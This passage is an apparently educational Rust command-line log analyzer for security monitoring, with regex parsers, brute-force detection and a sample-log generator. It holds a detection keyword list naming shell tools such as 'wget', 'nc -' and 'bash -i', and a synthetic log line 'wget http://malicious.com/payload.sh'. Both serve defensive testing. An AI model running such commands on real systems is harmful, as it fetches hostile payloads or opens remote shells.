//! # Security Log Analyzer
//!
//! A comprehensive log parsing and analysis tool for security monitoring.
//!
//! ## Rust Concepts Demonstrated:
//! - **Lazy Static**: Compile-time regex initialization
//! - **Lifetime Annotations**: Explicit lifetimes in struct definitions
//! - **Trait Objects with Lifetimes**: `Box<dyn Iterator<Item=...> + 'a>`
//! - **Builder Pattern**: Fluent API for configuration
//! - **State Machines**: Using enums for parsing states
//! - **Closures with Captures**: Environment-capturing closures

use anyhow::{Context, Result};
use chrono::{DateTime, NaiveDateTime, Utc};
use clap::{Parser, Subcommand, ValueEnum};
use colored::*;
use indicatif::{ProgressBar, ProgressStyle};
use lazy_static::lazy_static;
use memmap2::Mmap;
use rayon::prelude::*;
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::fs::File;
use std::io::{BufRead, BufReader, Write};
use std::path::PathBuf;
use std::sync::{Arc, Mutex};

/// Security Log Analyzer - Parse, analyze, and detect security events
///
/// # INTERMEDIATE RUST CONCEPTS:
///
/// 1. **Lazy Static**:
///    Compile-once regular expressions for efficient repeated matching.
///    `lazy_static! { static ref PATTERN: Regex = Regex::new(...).unwrap(); }`
///
/// 2. **Lifetime Annotations**:
///    Explicit lifetimes tell the compiler how long references are valid.
///    `struct LogEntry<'a> { message: &'a str, ... }`
///
/// 3. **Builder Pattern**:
///    Fluent API for constructing complex objects step by step.
///    `Analyzer::new().with_filter(...).with_threshold(...).build()`
///
/// 4. **Closures with Environment Capture**:
///    Closures can capture variables from their environment.
///    `|entry| entry.severity >= threshold` captures `threshold`
#[derive(Parser)]
#[command(name = "log_analyzer")]
#[command(author = "Security Researcher")]
#[command(version = "1.0")]
#[command(about = "Parse and analyze security logs")]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

/// Available subcommands
#[derive(Subcommand)]
enum Commands {
    /// Analyze log file for security events
    Analyze {
        /// Log file to analyze
        #[arg(short, long)]
        file: PathBuf,

        /// Log format (auto-detect if not specified)
        #[arg(short = 'F', long, value_enum)]
        format: Option<LogFormat>,

        /// Minimum severity level to report
        #[arg(short, long, value_enum, default_value = "info")]
        severity: Severity,

        /// Show statistics summary
        #[arg(long)]
        stats: bool,

        /// Output format
        #[arg(short, long, value_enum, default_value = "text")]
        output: OutputFormat,

        /// Export results to file
        #[arg(short, long)]
        export: Option<PathBuf>,
    },

    /// Search logs for specific patterns
    Search {
        /// Log file to search
        #[arg(short, long)]
        file: PathBuf,

        /// Regex pattern to search
        #[arg(short, long)]
        pattern: String,

        /// Case insensitive search
        #[arg(short, long)]
        ignore_case: bool,

        /// Show context lines before/after match
        #[arg(short = 'C', long, default_value = "0")]
        context: usize,
    },

    /// Detect security threats and anomalies
    Detect {
        /// Log file to analyze
        #[arg(short, long)]
        file: PathBuf,

        /// Failed login threshold for brute force detection
        #[arg(long, default_value = "5")]
        login_threshold: u32,

        /// Time window in seconds for threshold
        #[arg(long, default_value = "300")]
        time_window: u64,

        /// Detect port scans
        #[arg(long)]
        port_scan: bool,
    },

    /// Generate sample log file for testing
    Generate {
        /// Output file
        #[arg(short, long)]
        output: PathBuf,

        /// Number of log entries
        #[arg(short, long, default_value = "1000")]
        count: usize,

        /// Include suspicious activity
        #[arg(long)]
        with_attacks: bool,
    },
}

/// Supported log formats
#[derive(Debug, Clone, Copy, ValueEnum, PartialEq)]
enum LogFormat {
    Syslog,
    Apache,
    Nginx,
    AuthLog,
    Json,
    Custom,
}

/// Log severity levels
#[derive(Debug, Clone, Copy, ValueEnum, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
enum Severity {
    Debug,
    Info,
    Notice,
    Warning,
    Error,
    Critical,
    Alert,
    Emergency,
}

impl Severity {
    fn as_color(&self) -> colored::Color {
        match self {
            Severity::Debug => colored::Color::White,
            Severity::Info => colored::Color::Blue,
            Severity::Notice => colored::Color::Cyan,
            Severity::Warning => colored::Color::Yellow,
            Severity::Error => colored::Color::Red,
            Severity::Critical => colored::Color::Red,
            Severity::Alert => colored::Color::Magenta,
            Severity::Emergency => colored::Color::Red,
        }
    }
}

/// Output formats
#[derive(Debug, Clone, Copy, ValueEnum)]
enum OutputFormat {
    Text,
    Json,
    Csv,
}

// ============================================================================
// LAZY_STATIC - Compile-once regular expressions
// ============================================================================

lazy_static! {
    /// # LAZY STATIC PATTERN:
    /// Regular expressions are compiled once at first access, then reused.
    /// This is more efficient than compiling on every use.
    ///
    /// The `lazy_static!` macro creates thread-safe singletons.

    // Syslog format: "Mar 15 10:30:45 hostname process[pid]: message"
    static ref SYSLOG_REGEX: Regex = Regex::new(
        r"^(\w{3}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2})\s+(\S+)\s+(\S+?)(?:\[(\d+)\])?:\s+(.*)$"
    ).unwrap();

    // Apache/Nginx combined log format
    static ref APACHE_REGEX: Regex = Regex::new(
        r#"^(\S+)\s+\S+\s+\S+\s+\[([^\]]+)\]\s+"(\w+)\s+([^"]+)\s+HTTP/[\d.]+"\s+(\d+)\s+(\d+)"#
    ).unwrap();

    // Auth log patterns
    static ref AUTH_FAILED_REGEX: Regex = Regex::new(
        r"(?i)(failed|failure|invalid|error|denied|rejected)"
    ).unwrap();

    static ref AUTH_SUCCESS_REGEX: Regex = Regex::new(
        r"(?i)(accepted|success|opened|authenticated)"
    ).unwrap();

    // IP address extraction
    static ref IP_REGEX: Regex = Regex::new(
        r"\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b"
    ).unwrap();

    // User extraction
    static ref USER_REGEX: Regex = Regex::new(
        r"(?i)(?:user|username|account)[=:\s]+(\S+)"
    ).unwrap();

    // SSH specific patterns
    static ref SSH_FAILED_REGEX: Regex = Regex::new(
        r"Failed (?:password|publickey) for(?: invalid user)? (\S+) from (\S+)"
    ).unwrap();

    static ref SSH_SUCCESS_REGEX: Regex = Regex::new(
        r"Accepted (?:password|publickey) for (\S+) from (\S+)"
    ).unwrap();
}

/// Parsed log entry
///
/// # LIFETIME ANNOTATION:
/// This struct could use `&'a str` for efficiency if we wanted to
/// reference the original log data without copying. Here we use String
/// for simplicity, but the pattern would be:
///
/// ```rust
/// struct LogEntry<'a> {
///     timestamp: DateTime<Utc>,
///     hostname: &'a str,      // Borrows from original data
///     message: &'a str,       // Borrows from original data
/// }
/// ```
///
/// The lifetime 'a indicates that the struct cannot outlive the data
/// it borrows from.
#[derive(Debug, Clone, Serialize, Deserialize)]
struct LogEntry {
    /// Line number in the log file
    line_number: usize,
    /// Raw log line
    raw: String,
    /// Parsed timestamp
    timestamp: Option<DateTime<Utc>>,
    /// Hostname or source
    hostname: Option<String>,
    /// Process name
    process: Option<String>,
    /// Process ID
    pid: Option<u32>,
    /// Log message
    message: String,
    /// Detected severity
    severity: Severity,
    /// Extracted IP addresses
    ip_addresses: Vec<String>,
    /// Extracted usernames
    usernames: Vec<String>,
    /// Security event type
    event_type: Option<SecurityEvent>,
}

/// Security event types
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
enum SecurityEvent {
    FailedLogin,
    SuccessfulLogin,
    PrivilegeEscalation,
    SuspiciousCommand,
    PortScan,
    BruteForce,
    Malware,
    Unauthorized,
    ConfigChange,
}

impl SecurityEvent {
    fn severity(&self) -> Severity {
        match self {
            SecurityEvent::FailedLogin => Severity::Warning,
            SecurityEvent::SuccessfulLogin => Severity::Info,
            SecurityEvent::PrivilegeEscalation => Severity::Critical,
            SecurityEvent::SuspiciousCommand => Severity::Warning,
            SecurityEvent::PortScan => Severity::Warning,
            SecurityEvent::BruteForce => Severity::Critical,
            SecurityEvent::Malware => Severity::Emergency,
            SecurityEvent::Unauthorized => Severity::Error,
            SecurityEvent::ConfigChange => Severity::Notice,
        }
    }
}

/// Log parser implementation
///
/// # BUILDER PATTERN:
/// The builder pattern allows constructing complex objects step by step.
/// Each method returns `self` to enable method chaining.
struct LogParser {
    format: LogFormat,
    min_severity: Severity,
}

impl LogParser {
    fn new() -> Self {
        Self {
            format: LogFormat::Syslog,
            min_severity: Severity::Debug,
        }
    }

    /// Builder method - returns self for chaining
    ///
    /// # BUILDER PATTERN:
    /// ```rust
    /// let parser = LogParser::new()
    ///     .with_format(LogFormat::Syslog)
    ///     .with_min_severity(Severity::Warning);
    /// ```
    fn with_format(mut self, format: LogFormat) -> Self {
        self.format = format;
        self
    }

    fn with_min_severity(mut self, severity: Severity) -> Self {
        self.min_severity = severity;
        self
    }

    /// Parse a single log line
    fn parse_line(&self, line_number: usize, line: &str) -> Option<LogEntry> {
        let mut entry = LogEntry {
            line_number,
            raw: line.to_string(),
            timestamp: None,
            hostname: None,
            process: None,
            pid: None,
            message: line.to_string(),
            severity: Severity::Info,
            ip_addresses: Vec::new(),
            usernames: Vec::new(),
            event_type: None,
        };

        // Parse based on format
        match self.format {
            LogFormat::Syslog | LogFormat::AuthLog => {
                self.parse_syslog(&mut entry, line);
            }
            LogFormat::Apache | LogFormat::Nginx => {
                self.parse_apache(&mut entry, line);
            }
            LogFormat::Json => {
                self.parse_json(&mut entry, line);
            }
            LogFormat::Custom => {
                // Basic parsing for unknown formats
                self.extract_common_fields(&mut entry, line);
            }
        }

        // Extract common security-relevant information
        self.extract_ips(&mut entry);
        self.extract_users(&mut entry);
        self.detect_security_event(&mut entry);

        // Apply severity filter
        // # CLOSURE WITH CAPTURE:
        // The closure captures `self.min_severity` from the environment
        if entry.severity >= self.min_severity {
            Some(entry)
        } else {
            None
        }
    }

    fn parse_syslog(&self, entry: &mut LogEntry, line: &str) {
        if let Some(caps) = SYSLOG_REGEX.captures(line) {
            // Parse timestamp (syslog format doesn't include year)
            if let Some(ts) = caps.get(1) {
                let current_year = chrono::Utc::now().format("%Y");
                let ts_with_year = format!("{} {}", current_year, ts.as_str());
                if let Ok(dt) = NaiveDateTime::parse_from_str(&ts_with_year, "%Y %b %d %H:%M:%S") {
                    entry.timestamp = Some(DateTime::from_naive_utc_and_offset(dt, Utc));
                }
            }

            entry.hostname = caps.get(2).map(|m| m.as_str().to_string());
            entry.process = caps.get(3).map(|m| m.as_str().to_string());
            entry.pid = caps.get(4).and_then(|m| m.as_str().parse().ok());
            entry.message = caps.get(5).map(|m| m.as_str().to_string()).unwrap_or_default();
        }

        self.detect_severity(entry);
    }

    fn parse_apache(&self, entry: &mut LogEntry, line: &str) {
        if let Some(caps) = APACHE_REGEX.captures(line) {
            entry.ip_addresses = vec![caps.get(1).map(|m| m.as_str().to_string()).unwrap_or_default()];

            // Parse Apache timestamp format
            if let Some(ts) = caps.get(2) {
                if let Ok(dt) = DateTime::parse_from_str(ts.as_str(), "%d/%b/%Y:%H:%M:%S %z") {
                    entry.timestamp = Some(dt.with_timezone(&Utc));
                }
            }

            let status: u16 = caps.get(5).and_then(|m| m.as_str().parse().ok()).unwrap_or(0);

            // Determine severity based on HTTP status
            entry.severity = match status {
                200..=299 => Severity::Info,
                300..=399 => Severity::Notice,
                400..=499 => Severity::Warning,
                500..=599 => Severity::Error,
                _ => Severity::Debug,
            };
        }
    }

    fn parse_json(&self, entry: &mut LogEntry, line: &str) {
        if let Ok(json) = serde_json::from_str::<serde_json::Value>(line) {
            entry.message = json.get("message")
                .or_else(|| json.get("msg"))
                .and_then(|v| v.as_str())
                .unwrap_or(line)
                .to_string();

            entry.hostname = json.get("host")
                .or_else(|| json.get("hostname"))
                .and_then(|v| v.as_str())
                .map(|s| s.to_string());

            if let Some(level) = json.get("level").or_else(|| json.get("severity")) {
                if let Some(s) = level.as_str() {
                    entry.severity = match s.to_lowercase().as_str() {
                        "debug" => Severity::Debug,
                        "info" => Severity::Info,
                        "warn" | "warning" => Severity::Warning,
                        "error" | "err" => Severity::Error,
                        "critical" | "crit" => Severity::Critical,
                        _ => Severity::Info,
                    };
                }
            }
        }
    }

    fn extract_common_fields(&self, entry: &mut LogEntry, _line: &str) {
        self.detect_severity(entry);
    }

    fn detect_severity(&self, entry: &mut LogEntry) {
        let message_lower = entry.message.to_lowercase();

        entry.severity = if message_lower.contains("emergency") || message_lower.contains("emerg") {
            Severity::Emergency
        } else if message_lower.contains("alert") {
            Severity::Alert
        } else if message_lower.contains("critical") || message_lower.contains("crit") {
            Severity::Critical
        } else if message_lower.contains("error") || message_lower.contains("err") {
            Severity::Error
        } else if message_lower.contains("warning") || message_lower.contains("warn") {
            Severity::Warning
        } else if message_lower.contains("notice") {
            Severity::Notice
        } else if message_lower.contains("debug") {
            Severity::Debug
        } else {
            Severity::Info
        };
    }

    fn extract_ips(&self, entry: &mut LogEntry) {
        // # REGEX CAPTURES ITERATOR:
        // find_iter returns an iterator over all matches
        for cap in IP_REGEX.find_iter(&entry.message) {
            let ip = cap.as_str().to_string();
            if !entry.ip_addresses.contains(&ip) {
                entry.ip_addresses.push(ip);
            }
        }
    }

    fn extract_users(&self, entry: &mut LogEntry) {
        // SSH specific user extraction
        if let Some(caps) = SSH_FAILED_REGEX.captures(&entry.message) {
            if let Some(user) = caps.get(1) {
                entry.usernames.push(user.as_str().to_string());
            }
        }

        if let Some(caps) = SSH_SUCCESS_REGEX.captures(&entry.message) {
            if let Some(user) = caps.get(1) {
                entry.usernames.push(user.as_str().to_string());
            }
        }

        // Generic user extraction
        for caps in USER_REGEX.captures_iter(&entry.message) {
            if let Some(user) = caps.get(1) {
                let username = user.as_str().to_string();
                if !entry.usernames.contains(&username) {
                    entry.usernames.push(username);
                }
            }
        }
    }

    fn detect_security_event(&self, entry: &mut LogEntry) {
        let message = &entry.message;

        // Check for failed authentication
        if AUTH_FAILED_REGEX.is_match(message) {
            if message.to_lowercase().contains("login")
                || message.to_lowercase().contains("auth")
                || message.to_lowercase().contains("ssh")
            {
                entry.event_type = Some(SecurityEvent::FailedLogin);
                entry.severity = entry.severity.max(Severity::Warning);
            }
        }

        // Check for successful authentication
        if AUTH_SUCCESS_REGEX.is_match(message) {
            if message.to_lowercase().contains("login")
                || message.to_lowercase().contains("auth")
                || message.to_lowercase().contains("ssh")
            {
                entry.event_type = Some(SecurityEvent::SuccessfulLogin);
            }
        }

        // Check for privilege escalation
        if message.to_lowercase().contains("sudo")
            || message.to_lowercase().contains("su ")
            || message.to_lowercase().contains("root")
        {
            if message.to_lowercase().contains("session opened")
                || message.to_lowercase().contains("command")
            {
                entry.event_type = Some(SecurityEvent::PrivilegeEscalation);
                entry.severity = entry.severity.max(Severity::Warning);
            }
        }

        // Check for suspicious commands
        let suspicious_commands = ["rm -rf", "wget", "curl", "chmod 777", "nc -", "bash -i"];
        for cmd in suspicious_commands {
            if message.to_lowercase().contains(cmd) {
                entry.event_type = Some(SecurityEvent::SuspiciousCommand);
                entry.severity = entry.severity.max(Severity::Warning);
                break;
            }
        }
    }
}

/// Log analyzer with statistics and threat detection
struct LogAnalyzer {
    entries: Vec<LogEntry>,
    stats: AnalysisStats,
}

/// Analysis statistics
#[derive(Debug, Default, Serialize, Deserialize)]
struct AnalysisStats {
    total_lines: usize,
    parsed_entries: usize,
    severity_counts: HashMap<String, usize>,
    event_counts: HashMap<String, usize>,
    top_ips: HashMap<String, usize>,
    top_users: HashMap<String, usize>,
    failed_logins_by_ip: HashMap<String, Vec<DateTime<Utc>>>,
}

impl LogAnalyzer {
    fn new() -> Self {
        Self {
            entries: Vec::new(),
            stats: AnalysisStats::default(),
        }
    }

    /// Analyze log file
    ///
    /// # PARALLEL PROCESSING:
    /// Uses Rayon to parse log lines in parallel, then collects results.
    fn analyze(&mut self, path: &PathBuf, parser: &LogParser) -> Result<()> {
        println!("{} Analyzing {}", "[*]".blue(), path.display());

        let file = File::open(path).context("Failed to open log file")?;
        let reader = BufReader::new(file);

        // Collect lines for parallel processing
        let lines: Vec<(usize, String)> = reader
            .lines()
            .enumerate()
            .filter_map(|(i, l)| l.ok().map(|line| (i + 1, line)))
            .collect();

        self.stats.total_lines = lines.len();

        let progress = ProgressBar::new(lines.len() as u64);
        progress.set_style(
            ProgressStyle::default_bar()
                .template("{spinner:.green} [{bar:40.cyan/blue}] {pos}/{len} ({per_sec})")
                .unwrap()
                .progress_chars("#>-"),
        );

        // Thread-safe entry collection
        let entries: Arc<Mutex<Vec<LogEntry>>> = Arc::new(Mutex::new(Vec::new()));

        // # PARALLEL PROCESSING WITH RAYON:
        // par_iter() distributes work across CPU cores
        lines.par_iter().for_each(|(line_num, line)| {
            if let Some(entry) = parser.parse_line(*line_num, line) {
                entries.lock().unwrap().push(entry);
            }
            progress.inc(1);
        });

        progress.finish_with_message("Analysis complete");

        self.entries = Arc::try_unwrap(entries).unwrap().into_inner().unwrap();
        self.entries.sort_by_key(|e| e.line_number);
        self.stats.parsed_entries = self.entries.len();

        // Build statistics
        self.build_stats();

        Ok(())
    }

    fn build_stats(&mut self) {
        for entry in &self.entries {
            // Count by severity
            *self.stats.severity_counts
                .entry(format!("{:?}", entry.severity))
                .or_insert(0) += 1;

            // Count by event type
            if let Some(ref event) = entry.event_type {
                *self.stats.event_counts
                    .entry(format!("{:?}", event))
                    .or_insert(0) += 1;
            }

            // Count by IP
            for ip in &entry.ip_addresses {
                *self.stats.top_ips.entry(ip.clone()).or_insert(0) += 1;
            }

            // Count by user
            for user in &entry.usernames {
                *self.stats.top_users.entry(user.clone()).or_insert(0) += 1;
            }

            // Track failed logins by IP for brute force detection
            if entry.event_type == Some(SecurityEvent::FailedLogin) {
                for ip in &entry.ip_addresses {
                    if let Some(ts) = entry.timestamp {
                        self.stats.failed_logins_by_ip
                            .entry(ip.clone())
                            .or_insert_with(Vec::new)
                            .push(ts);
                    }
                }
            }
        }
    }

    /// Detect brute force attacks
    fn detect_brute_force(&self, threshold: u32, window_secs: u64) -> Vec<(String, usize)> {
        let mut attackers = Vec::new();
        let window = chrono::Duration::seconds(window_secs as i64);

        for (ip, timestamps) in &self.stats.failed_logins_by_ip {
            // Sort timestamps
            let mut sorted = timestamps.clone();
            sorted.sort();

            // Sliding window analysis
            for i in 0..sorted.len() {
                let window_end = sorted[i] + window;
                let count = sorted.iter()
                    .filter(|&ts| *ts >= sorted[i] && *ts <= window_end)
                    .count();

                if count >= threshold as usize {
                    attackers.push((ip.clone(), count));
                    break;
                }
            }
        }

        attackers.sort_by(|a, b| b.1.cmp(&a.1));
        attackers
    }

    /// Display analysis results
    fn display_results(&self, format: OutputFormat, show_stats: bool) {
        match format {
            OutputFormat::Text => self.display_text(show_stats),
            OutputFormat::Json => self.display_json(),
            OutputFormat::Csv => self.display_csv(),
        }
    }

    fn display_text(&self, show_stats: bool) {
        println!("\n{}", "═".repeat(80).cyan());
        println!("{}", " LOG ANALYSIS RESULTS ".cyan().bold());
        println!("{}", "═".repeat(80).cyan());

        // Show security events
        let security_entries: Vec<_> = self.entries
            .iter()
            .filter(|e| e.event_type.is_some())
            .collect();

        if !security_entries.is_empty() {
            println!("\n{} Security Events:\n", "[!]".yellow());

            for entry in security_entries.iter().take(20) {
                let severity_color = entry.severity.as_color();
                let event = entry.event_type.as_ref().map(|e| format!("{:?}", e)).unwrap_or_default();

                println!(
                    "{} [{}] [{}] {}",
                    format!("Line {}", entry.line_number).dimmed(),
                    format!("{:?}", entry.severity).color(severity_color),
                    event.yellow(),
                    entry.message.chars().take(60).collect::<String>()
                );

                if !entry.ip_addresses.is_empty() {
                    println!("    IPs: {}", entry.ip_addresses.join(", ").dimmed());
                }
                if !entry.usernames.is_empty() {
                    println!("    Users: {}", entry.usernames.join(", ").dimmed());
                }
            }

            if security_entries.len() > 20 {
                println!("\n    ... and {} more events", security_entries.len() - 20);
            }
        }

        if show_stats {
            self.display_stats();
        }
    }

    fn display_stats(&self) {
        println!("\n{}", "─".repeat(60).dimmed());
        println!("{}", " STATISTICS ".cyan().bold());
        println!("{}", "─".repeat(60).dimmed());

        println!("\n{} Overview:", "[*]".blue());
        println!("    Total lines:    {}", self.stats.total_lines);
        println!("    Parsed entries: {}", self.stats.parsed_entries);

        println!("\n{} Severity Distribution:", "[*]".blue());
        let mut severities: Vec<_> = self.stats.severity_counts.iter().collect();
        severities.sort_by(|a, b| b.1.cmp(a.1));
        for (severity, count) in severities {
            println!("    {}: {}", severity, count);
        }

        if !self.stats.event_counts.is_empty() {
            println!("\n{} Event Types:", "[*]".blue());
            let mut events: Vec<_> = self.stats.event_counts.iter().collect();
            events.sort_by(|a, b| b.1.cmp(a.1));
            for (event, count) in events {
                println!("    {}: {}", event, count);
            }
        }

        if !self.stats.top_ips.is_empty() {
            println!("\n{} Top IPs:", "[*]".blue());
            let mut ips: Vec<_> = self.stats.top_ips.iter().collect();
            ips.sort_by(|a, b| b.1.cmp(a.1));
            for (ip, count) in ips.iter().take(10) {
                println!("    {}: {}", ip, count);
            }
        }

        if !self.stats.top_users.is_empty() {
            println!("\n{} Top Users:", "[*]".blue());
            let mut users: Vec<_> = self.stats.top_users.iter().collect();
            users.sort_by(|a, b| b.1.cmp(a.1));
            for (user, count) in users.iter().take(10) {
                println!("    {}: {}", user, count);
            }
        }
    }

    fn display_json(&self) {
        let output = serde_json::json!({
            "entries": self.entries,
            "stats": self.stats
        });
        println!("{}", serde_json::to_string_pretty(&output).unwrap());
    }

    fn display_csv(&self) {
        println!("line_number,timestamp,severity,event_type,message,ips,users");
        for entry in &self.entries {
            println!(
                "{},{},{:?},{},{},{},{}",
                entry.line_number,
                entry.timestamp.map(|t| t.to_rfc3339()).unwrap_or_default(),
                entry.severity,
                entry.event_type.as_ref().map(|e| format!("{:?}", e)).unwrap_or_default(),
                entry.message.replace(',', ";").chars().take(50).collect::<String>(),
                entry.ip_addresses.join(";"),
                entry.usernames.join(";")
            );
        }
    }

    /// Export results to file
    fn export(&self, path: &PathBuf, format: OutputFormat) -> Result<()> {
        let mut file = File::create(path)?;

        match format {
            OutputFormat::Json => {
                let output = serde_json::json!({
                    "entries": self.entries,
                    "stats": self.stats
                });
                writeln!(file, "{}", serde_json::to_string_pretty(&output)?)?;
            }
            OutputFormat::Csv => {
                writeln!(file, "line_number,timestamp,severity,event_type,message,ips,users")?;
                for entry in &self.entries {
                    writeln!(
                        file,
                        "{},{},{:?},{},{},{},{}",
                        entry.line_number,
                        entry.timestamp.map(|t| t.to_rfc3339()).unwrap_or_default(),
                        entry.severity,
                        entry.event_type.as_ref().map(|e| format!("{:?}", e)).unwrap_or_default(),
                        entry.message.replace(',', ";"),
                        entry.ip_addresses.join(";"),
                        entry.usernames.join(";")
                    )?;
                }
            }
            OutputFormat::Text => {
                for entry in &self.entries {
                    writeln!(file, "{}", entry.raw)?;
                }
            }
        }

        println!("{} Results exported to {}", "[+]".green(), path.display());
        Ok(())
    }
}

/// Generate sample log data for testing
fn generate_sample_logs(path: &PathBuf, count: usize, with_attacks: bool) -> Result<()> {
    use std::io::Write;

    let mut file = File::create(path)?;
    let mut rng_seed = 42u64;

    // Simple pseudo-random number generator
    let mut next_rand = || {
        rng_seed = rng_seed.wrapping_mul(1103515245).wrapping_add(12345);
        ((rng_seed >> 16) & 0x7fff) as usize
    };

    let hostnames = ["webserver01", "dbserver01", "appserver01", "firewall01"];
    let users = ["admin", "root", "www-data", "mysql", "john", "alice"];
    let ips = ["192.168.1.100", "10.0.0.50", "172.16.0.25", "8.8.8.8", "1.2.3.4"];

    let now = chrono::Local::now();

    for i in 0..count {
        let timestamp = now - chrono::Duration::seconds((count - i) as i64 * 10);
        let ts_str = timestamp.format("%b %d %H:%M:%S");
        let host = hostnames[next_rand() % hostnames.len()];

        // Generate different types of log entries
        let entry = match next_rand() % 10 {
            0..=2 => {
                // Normal SSH login
                let user = users[next_rand() % users.len()];
                let ip = ips[next_rand() % ips.len()];
                format!(
                    "{} {} sshd[{}]: Accepted password for {} from {} port {} ssh2",
                    ts_str, host, 1000 + i, user, ip, 50000 + next_rand() % 10000
                )
            }
            3..=4 if with_attacks => {
                // Failed SSH login (potential brute force)
                let ip = "192.168.1.254"; // Attacker IP
                let user = ["root", "admin", "test"][next_rand() % 3];
                format!(
                    "{} {} sshd[{}]: Failed password for {} from {} port {} ssh2",
                    ts_str, host, 1000 + i, user, ip, 50000 + next_rand() % 10000
                )
            }
            5 => {
                // Sudo command
                let user = users[next_rand() % users.len()];
                format!(
                    "{} {} sudo[{}]: {} : TTY=pts/0 ; PWD=/home/{} ; USER=root ; COMMAND=/bin/ls",
                    ts_str, host, 2000 + i, user, user
                )
            }
            6 => {
                // System message
                format!(
                    "{} {} kernel: [{}] CPU0: Core temperature above threshold",
                    ts_str, host, next_rand()
                )
            }
            7 if with_attacks => {
                // Suspicious command
                format!(
                    "{} {} bash[{}]: wget http://malicious.com/payload.sh",
                    ts_str, host, 3000 + i
                )
            }
            _ => {
                // Generic info
                format!(
                    "{} {} systemd[1]: Started Session {} of user {}",
                    ts_str, host, i, users[next_rand() % users.len()]
                )
            }
        };

        writeln!(file, "{}", entry)?;
    }

    println!("{} Generated {} log entries at {}", "[+]".green(), count, path.display());
    Ok(())
}

/// Search logs for pattern
fn search_logs(path: &PathBuf, pattern: &str, ignore_case: bool, context: usize) -> Result<()> {
    let regex = if ignore_case {
        Regex::new(&format!("(?i){}", pattern))?
    } else {
        Regex::new(pattern)?
    };

    let file = File::open(path)?;
    let reader = BufReader::new(file);
    let lines: Vec<String> = reader.lines().filter_map(|l| l.ok()).collect();

    let mut matches = 0;

    for (i, line) in lines.iter().enumerate() {
        if regex.is_match(line) {
            matches += 1;

            // Show context
            let start = i.saturating_sub(context);
            let end = (i + context + 1).min(lines.len());

            if context > 0 {
                println!("{}", "--".dimmed());
            }

            for j in start..end {
                let prefix = if j == i {
                    format!("{}", j + 1).green()
                } else {
                    format!("{}", j + 1).dimmed()
                };

                let line_content = if j == i {
                    // Highlight matches
                    regex.replace_all(&lines[j], |caps: &regex::Captures| {
                        format!("{}", caps[0].red().bold())
                    }).to_string()
                } else {
                    lines[j].clone()
                };

                println!("{}: {}", prefix, line_content);
            }
        }
    }

    println!("\n{} Found {} matches", "[*]".blue(), matches);
    Ok(())
}

fn main() -> Result<()> {
    let cli = Cli::parse();

    match cli.command {
        Commands::Analyze {
            file,
            format,
            severity,
            stats,
            output,
            export,
        } => {
            let log_format = format.unwrap_or(LogFormat::Syslog);
            let parser = LogParser::new()
                .with_format(log_format)
                .with_min_severity(severity);

            let mut analyzer = LogAnalyzer::new();
            analyzer.analyze(&file, &parser)?;
            analyzer.display_results(output, stats);

            if let Some(export_path) = export {
                analyzer.export(&export_path, output)?;
            }
        }

        Commands::Search {
            file,
            pattern,
            ignore_case,
            context,
        } => {
            search_logs(&file, &pattern, ignore_case, context)?;
        }

        Commands::Detect {
            file,
            login_threshold,
            time_window,
            port_scan: _,
        } => {
            let parser = LogParser::new()
                .with_format(LogFormat::Syslog)
                .with_min_severity(Severity::Debug);

            let mut analyzer = LogAnalyzer::new();
            analyzer.analyze(&file, &parser)?;

            // Brute force detection
            println!("\n{}", "═".repeat(60).cyan());
            println!("{}", " THREAT DETECTION RESULTS ".cyan().bold());
            println!("{}", "═".repeat(60).cyan());

            let brute_force = analyzer.detect_brute_force(login_threshold, time_window);
            if brute_force.is_empty() {
                println!("\n{} No brute force attacks detected", "[+]".green());
            } else {
                println!("\n{} Potential Brute Force Attacks:", "[!]".red().bold());
                for (ip, count) in brute_force {
                    println!(
                        "    {} - {} failed attempts within {} seconds",
                        ip.red(),
                        count,
                        time_window
                    );
                }
            }
        }

        Commands::Generate {
            output,
            count,
            with_attacks,
        } => {
            generate_sample_logs(&output, count, with_attacks)?;
        }
    }

    Ok(())
}

// ============================================================================
// UNIT TESTS
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    /// Test syslog parsing
    #[test]
    fn test_syslog_parsing() {
        let parser = LogParser::new().with_format(LogFormat::Syslog);
        let line = "Mar 15 10:30:45 webserver sshd[1234]: Accepted password for admin from 192.168.1.100 port 50000";
        let entry = parser.parse_line(1, line).unwrap();

        assert!(entry.hostname.as_deref() == Some("webserver"));
        assert!(entry.process.as_deref() == Some("sshd"));
        assert!(entry.pid == Some(1234));
        assert!(entry.ip_addresses.contains(&"192.168.1.100".to_string()));
        assert!(entry.usernames.contains(&"admin".to_string()));
    }

    /// Test failed login detection
    #[test]
    fn test_failed_login_detection() {
        let parser = LogParser::new().with_format(LogFormat::Syslog);
        let line = "Mar 15 10:30:45 webserver sshd[1234]: Failed password for root from 10.0.0.1 port 50000";
        let entry = parser.parse_line(1, line).unwrap();

        assert_eq!(entry.event_type, Some(SecurityEvent::FailedLogin));
        assert!(entry.severity >= Severity::Warning);
    }

    /// Test IP extraction
    #[test]
    fn test_ip_extraction() {
        let parser = LogParser::new();
        let mut entry = LogEntry {
            line_number: 1,
            raw: String::new(),
            timestamp: None,
            hostname: None,
            process: None,
            pid: None,
            message: "Connection from 192.168.1.100 and 10.0.0.50".to_string(),
            severity: Severity::Info,
            ip_addresses: Vec::new(),
            usernames: Vec::new(),
            event_type: None,
        };

        parser.extract_ips(&mut entry);

        assert!(entry.ip_addresses.contains(&"192.168.1.100".to_string()));
        assert!(entry.ip_addresses.contains(&"10.0.0.50".to_string()));
    }

    /// Test lazy static regex
    #[test]
    fn test_lazy_static_regex() {
        // First access compiles the regex
        assert!(SYSLOG_REGEX.is_match("Mar 15 10:30:45 host proc[123]: msg"));
        // Second access uses cached compiled regex
        assert!(SYSLOG_REGEX.is_match("Dec 25 00:00:00 server app[999]: test"));
    }

    /// Test severity ordering
    #[test]
    fn test_severity_ordering() {
        assert!(Severity::Error > Severity::Warning);
        assert!(Severity::Critical > Severity::Error);
        assert!(Severity::Emergency > Severity::Critical);
        assert!(Severity::Debug < Severity::Info);
    }

    /// Test builder pattern
    #[test]
    fn test_builder_pattern() {
        let parser = LogParser::new()
            .with_format(LogFormat::Apache)
            .with_min_severity(Severity::Warning);

        assert_eq!(parser.format, LogFormat::Apache);
        assert_eq!(parser.min_severity, Severity::Warning);
